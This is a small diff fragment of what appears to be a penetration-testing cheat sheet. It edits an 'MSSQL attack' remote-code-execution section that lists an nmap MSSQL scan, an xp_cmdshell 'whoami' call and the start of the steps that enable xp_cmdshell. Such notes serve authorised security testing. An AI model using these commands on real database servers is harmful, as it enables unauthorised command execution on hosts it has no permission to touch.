@@ -542,7 +542,7 @@ $ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql
 ### MSSQL attack
 - **rce** 
 ```shell
-xp_cmdshell 'whoami'
+xp_cmdshell whoami
 
 # enable xp_cmdshell
 EXECUTE sp_configure 'show advanced options', 1
